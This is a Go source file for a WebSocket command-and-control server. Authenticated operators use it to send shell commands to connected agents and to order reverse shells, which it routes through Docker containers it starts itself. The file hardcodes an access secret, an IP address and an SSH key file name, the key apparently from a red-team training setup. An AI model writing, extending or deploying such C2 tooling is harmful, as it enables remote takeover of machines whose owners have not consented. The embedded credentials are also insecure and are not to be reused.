package main

import (
	"errors"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"golang.org/x/net/websocket"
)

type ConnStats struct {
	auth          bool
	id            string
	name          string
	rsStage       int
	port          string
	containerPort string
}

type Server struct {
	conns    map[*websocket.Conn]ConnStats
	secret   string
	usedPort []string
}

func (c *ConnStats) setRstage(v int) {
	c.rsStage = v
}

func (c *ConnStats) setPort(v string) {
	c.port = v
}
func (c *ConnStats) setContainerPort(v string) {
	c.containerPort = v
}

func NewServer() *Server {
	return &Server{
		conns:  make(map[*websocket.Conn]ConnStats),
		secret: "EnCryp!e0?",
	}
}

func (s *Server) handleWS(ws *websocket.Conn) {
	fmt.Println("New connection ...", ws.RemoteAddr())
	stats := ConnStats{}
	stats.auth = false
	stats.id = RandomString(6)
	stats.name = ""
	stats.rsStage = -1
	s.conns[ws] = stats
	s.listenLoop(ws)
}

func (s *Server) listenLoop(ws *websocket.Conn) {
	buf := make([]byte, 4096)
	for {
		stat := s.conns[ws]

		n, err := ws.Read(buf)
		if err != nil {
			if err == io.EOF {
				break
			}
			fmt.Println(err)
			continue
		}
		payload := buf[:n]
		msg := string(payload)
		if stat.auth == false && !isAuthCmd(msg) {
			send("E403: Please authenticate first !", ws)
		} else {

			s.command(payload, ws)
		}

	}

}

func (s *Server) direct(b []byte, ids []string, wsSender *websocket.Conn) {
	counter := 0

	for ws, stat := range s.conns {
		// fmt.Print(stat)
		if isElementExist(ids, stat.id) {
			if stat.auth == true {
				if send(string(b), ws) {
					counter++
				}
			}
		}
	}
	send("Succefully sent: "+strconv.Itoa(counter), wsSender)
}

func (s *Server) broadcast(b []byte, wsSender *websocket.Conn) {
	for ws, stat := range s.conns {
		// fmt.Print(stat)
		if stat.auth == true {
			send(string(b), ws)
		}
	}
}

func (s *Server) command(b []byte, wsSender *websocket.Conn) {
	str := string(b)
	_log := "[" + s.conns[wsSender].name + "@" + s.conns[wsSender].id + "]: " + str
	log.Printf("%s.\n", _log)
	args := strings.SplitN(str, ":", 2)
	if len(args) != 2 {
		fmt.Printf("Empty parameter!")
		return
	}
	switch args[0] {
	case "/auth":
		// fmt.Println("command------case:autenticate")
		s.authenticate(args[1], wsSender)
		break
	case "/msg":
		// fmt.Println("command------case:msg")
		if len(args) < 2 {
			send("Empty parameter !", wsSender)
		} else {
			s.msg(args[1], wsSender)
		}
		break
	case "/cmd":
		// fmt.Println("command------case:cmd")
		if len(args) < 2 {
			send("Empty parameter !", wsSender)
		} else {
			s.cmd(args[1], wsSender)
		}
		break
	case "/id":
		// fmt.Println("command------case:id")
		if len(args) < 2 {
			s.id("", wsSender)
		} else {
			s.id(args[1], wsSender)
		}
		break
	case "/ping":
		// fmt.Println("command------case:ping")
		if len(args) < 2 {
			send("Empty parameter !", wsSender)
		} else {
			s.ping(args[1], wsSender)
		}
		break
	case "/pong":
		// fmt.Println("command------case:pong")
		if len(args) < 2 {
			send("Empty parameter !", wsSender)
		} else {
			s.pong(args[1], wsSender)
		}
		break
	case "/os":
		// fmt.Println("command------case:pong")
		if len(args) < 2 {
			send("Empty parameter !", wsSender)
		} else {
			s.handleOs(args[1], wsSender)
		}
		break
	case "/all":
		if len(args) < 2 {
			s.all("", wsSender)
		} else {
			s.all(args[1], wsSender)
		}
		break
	case "/rs":
		if len(args) < 2 {
			send("Empty parameter !", wsSender)
		} else {
			params := s.rsParser(args[1])
			s.revSh(params[0], params[1], params[2], params[3], params[4], wsSender)
		}
		break
	default:
		s.all(str, wsSender)
	}

}

func (s *Server) authenticate(args string, wsSender *websocket.Conn) {
	_stats := s.conns[wsSender]
	data := strings.Split(args, "@")
	name := data[0]
	pass := data[1]
	// fmt.Println(data)
	msg := "E001: Incorrect secret"
	if pass == s.secret {
		stats := ConnStats{
			auth: true,
			name: name,
			id:   _stats.id,
		}
		s.conns[wsSender] = stats
		msg = "S001: " + stats.id + "/" + stats.name
		// fmt.Print(s.conns[wsSender])
		// return true
	}
	send("[auth] -> "+msg, wsSender)
	// return false
}

func (s *Server) msg(args string, wsSender *websocket.Conn) {
	data := strings.Split(args, " -> ")
	msg := data[0]
	listId := data[1]
	listIdtab := strings.Split(listId, " ")
	msg = "[" + s.conns[wsSender].name + "] : " + msg
	s.direct([]byte(msg), listIdtab, wsSender)
}

func (s *Server) cmd(args string, wsSender *websocket.Conn) {
	data := strings.Split(args, " -> ")
	msg := data[0]
	listIdtab := []string{data[1]}
	msg = "[cmd] -> " + msg + " <- " + s.conns[wsSender].id
	s.direct([]byte(msg), listIdtab, wsSender)
}

func (s *Server) all(msg string, wsSender *websocket.Conn) {
	msg = "[" + s.conns[wsSender].name + "] : " + msg
	s.broadcast([]byte(msg), wsSender)
}

func (s *Server) ping(args string, wsSender *websocket.Conn) {
	listIdtab := strings.Split(args, " ")
	msg := "[ping] -> " + s.conns[wsSender].id
	s.direct([]byte(msg), listIdtab, wsSender)
}

func (s *Server) pong(args string, wsSender *websocket.Conn) {
	listIdtab := strings.Split(args, " ")
	msg := "[pong] <- " + s.conns[wsSender].id
	s.direct([]byte(msg), listIdtab, wsSender)
}

func (s *Server) handleOs(args string, wsSender *websocket.Conn) {
	listIdtab := strings.Split(args, " ")
	msg := "[os] -> " + s.conns[wsSender].id
	s.direct([]byte(msg), listIdtab, wsSender)
}

func (s *Server) id(args string, wsSender *websocket.Conn) {
	result := "id:name\n=========="
	switch args {
	case "all":

		for _, stat := range s.conns {
			if stat.auth {
				if stat.id == s.conns[wsSender].id {
					result = result + "\n" + "[" + stat.id + ":" + stat.name + "]"
				} else {
					result = result + "\n" + stat.id + ":" + stat.name
				}
			}
		}
		send(result, wsSender)

	default:
		send(result+"\n"+s.conns[wsSender].id+":"+s.conns[wsSender].name, wsSender)
	}
}

func (s *Server) rsParser(args string) [5]string {
	params := strings.SplitN(args, " ", 5)
	if len(params) < 4 {
		fmt.Print("empty params")
		return [5]string{"", "", "*", "", ""}
	}
	if len(params) < 5 {
		fmt.Print("empty params")
		return [5]string{params[0], params[1], "*", params[2], params[3]}
	}

	return [5]string{params[0], params[1], params[2], params[3], params[4]} //agent, shell, ip, ssh user, ssh proxy

}

func (s *Server) rsRequest(agentId string, shell string, rserverIp string, rserverPort string, userSsh string, ipSsh string, wsSender *websocket.Conn) {
	id := []string{agentId}
	msg := "[rs] -> " + shell + " " + rserverIp + " " + rserverPort + " " + userSsh + " " + ipSsh + " <- " + s.conns[wsSender].id // shell ip port
	s.direct([]byte(msg), id, wsSender)
}

func (s *Server) revSh(agentId string, shell string, rserverIp string, user string, ipSsh string, wsSender *websocket.Conn) {
	intport := strconv.Itoa(6000 + rand.Intn(1000))
	extport := strconv.Itoa(7700 + rand.Intn(100))
	fmt.Println(extport, s.usedPort)
	for {
		if isElementExist(s.usedPort, extport) == false {
			break
		}
		extport = strconv.Itoa(7700 + rand.Intn(100))
	}
	image := "devoxit/rserver:latest"
	// send command to spin a reverse server
	cmdStr := "sudo docker run -p " + extport + ":" + intport + " --name rs_" + agentId + " -i " + image + " /usr/src/app/rserver tcp " + intport

	send("please connect here:\n ssh ubuntu@15.168.53.14 -i tm-red-traning-srv1.pem  \""+cmdStr+"\"", wsSender)
	conn, err := s.getConnById(agentId)
	if err != nil {
		fmt.Print(err)
	}
	conn.setPort(extport)
	conn.setContainerPort(intport)
	conn.setRstage(0) // waiting for container to spin up (user connection)
	state := s.waitForRServer(agentId)
	if state != true {
		fmt.Println("connection timeout ...")
		send("connection timeout ... !\nPlease retry again ! ", wsSender)
		s.rsCleanUp(agentId)
	}
	s.usedPort = append(s.usedPort, extport)
	// send to agent order
	if conn.rsStage != 1 {
		fmt.Println("Something went wrong ...")
		send("Something went wrong ... !\nPlease retry again ! ", wsSender)
		s.rsCleanUp(agentId)
	}
	s.rsRequest(agentId, shell, rserverIp, extport, user, ipSsh, wsSender)
}

func main() {
	prog := os.Args[0]
	if len(os.Args[:]) < 2 {
		fmt.Println(fmt.Sprintf("usage: %s <port>", prog))
		return
	}
	server := NewServer()
	http.Handle("/ws", websocket.Handler(server.handleWS))
	fmt.Println("listen in port " + os.Args[1])
	log.Fatal(http.ListenAndServe(":"+os.Args[1], nil))
}

func send(str string, ws *websocket.Conn) bool {
	_, err := ws.Write([]byte(str))
	if err != nil {
		fmt.Println("Error: ", err)
		return false
	}
	return true
}

func isElementExist(tab []string, i string) bool {
	for _, v := range tab {
		if i == v {
			return true
		}
	}
	return false
}

func isAuthCmd(str string) bool {
	args := strings.Split(str, ":")
	// fmt.Println(args[0] == "/auth")
	return args[0] == "/auth"
}

func RandomString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

	s := make([]rune, n)
	for i := range s {
		s[i] = letters[rand.Intn(len(letters))]
	}
	return string(s)
}

func (s *Server) waitForRServer(agentId string) bool {
	counter := 0
	for {
		if counter%6 == 0 {
			fmt.Print("Timout in " + strconv.Itoa(5-(counter/6)) + " min ...")
		}
		fmt.Print(".")
		out, err := exec.Command("sudo", "docker", "inspect", "-f", "'{{.State.Status}}'", "rs_"+agentId).Output()
		fmt.Println(string(out), err)
		if string(out) == "'running'\n" {
			conn, err := s.getConnById(agentId)
			if err != nil {
				return false
			}
			conn.setRstage(1)
			fmt.Printf("Successfuly conneted !", out)
			return true
		}
		counter++
		if counter > 30 {
			return false
		}
		time.Sleep(10000 * time.Millisecond)
	}

	return true

}

func (s *Server) getConnById(id string) (ConnStats, error) {
	for _, v := range s.conns {
		if id == v.id {
			return v, nil
		}
	}
	return ConnStats{}, errors.New("Not found")
}

func (s *Server) rsCleanUp(agentId string) {
	conn, err := s.getConnById(agentId)
	if err != nil {
		fmt.Println("connection not found")
		return
	}

	conn.setRstage(-1)
	conn.setPort("")
	conn.setContainerPort("")

	exec.Command("docker", "stop", "rs_"+agentId)
	exec.Command("docker", "rm", "rs_"+agentId)
}
